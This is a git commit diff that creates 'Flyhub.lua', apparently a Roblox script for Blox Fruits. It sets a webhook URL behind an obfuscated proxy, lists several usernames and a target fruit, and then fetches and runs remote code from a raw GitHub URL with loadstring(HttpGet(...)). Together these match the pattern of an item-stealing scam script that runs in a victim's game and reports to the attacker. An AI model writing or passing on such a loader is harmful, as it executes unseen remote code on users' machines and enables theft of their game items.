8d1332ddf1bbe3290e21727d64142bc554e9754e
dohoGR <magazinm153@gmail.com>
2025-03-28 18:57:31 +0300

    Create Flyhub.lua

---
+++ Flyhub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VmgyWnBGZHpSTVEtWXpibmpWNXU3ZzpObktvdXFPZHV2UDFudThrd0tlVFY3WFhOWFYybW9Fc0Y5bjF1S3NKeEFPM2ZKQmtMak5heXVrZHJ6cUxKOHh4R0xudkFWTzJQa1BFdEZMMTlEX0xDQ2ZGYnlNZlRvOXd0VDczaktjeG1SLW90cFZaZS16dEFvOUcwSnFvUTJnWW00M2t5THNIU3RSMVFGNlRFRHFSU2hsc2NzSS1kOGE5REo1dlF6LUpFb0E"
+Usernames = {"im_kiddd8 im_kiddd9 AWALS2011 Ghostywateryt"}
+FruitsToHit = {"Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
